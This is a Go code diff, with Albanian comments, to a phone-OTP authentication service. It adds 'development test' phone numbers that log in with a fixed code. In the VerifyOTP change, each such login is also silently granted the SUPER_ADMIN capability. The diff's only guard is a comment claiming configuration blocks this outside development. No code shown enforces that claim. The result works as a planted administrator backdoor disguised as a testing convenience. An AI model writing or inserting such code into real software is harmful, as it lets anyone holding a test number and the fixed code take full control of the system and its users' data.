@@ -25,6 +25,30 @@ type Service struct {
 	signer *Signer
 	ledger *ledger.Service
 	pepper []byte
+
+	// Numra prove me kod fiks (vetëm development). Bosh në çdo mjedis tjetër.
+	testPhones map[string]struct{}
+	testOTP    string
+}
+
+// WithDevTestPhones aktivizon kyçjen me kod fiks për numrat e dhënë. Konfigurimi e ka
+// refuzuar tashmë këtë jashtë development-it; këtu vetëm regjistrohet lista.
+func (s *Service) WithDevTestPhones(phones []string, code string) *Service {
+	if len(phones) == 0 || code == "" {
+		return s
+	}
+	s.testPhones = make(map[string]struct{}, len(phones))
+	for _, p := range phones {
+		s.testPhones[p] = struct{}{}
+	}
+	s.testOTP = code
+	return s
+}
+
+// isTestPhone thotë nëse numri kyçet me kodin fiks të provës.
+func (s *Service) isTestPhone(phone string) bool {
+	_, ok := s.testPhones[phone]
+	return ok
 }
 
 func New(pool *pgxpool.Pool, rdb redis.UniversalClient, smsp sms.Provider, signer *Signer, led *ledger.Service, pepper []byte) *Service {
@@ -90,6 +114,15 @@ func (s *Service) VerifyOTP(ctx context.Context, phone, code, locale string, dev
 			return err
 		case status != "active":
 			return httpx.ErrForbidden
+		}
+
+		// Numri i provës është edhe administrator: kështu paneli provohet pa ndezje të dytë.
+		if s.isTestPhone(phone) {
+			if _, err := tx.Exec(ctx, `
+				INSERT INTO user_capabilities (user_id, capability) VALUES ($1, 'SUPER_ADMIN')
+				ON CONFLICT DO NOTHING`, userID); err != nil {
+				return err
+			}
 		}
 
 		// sesioni + refresh token
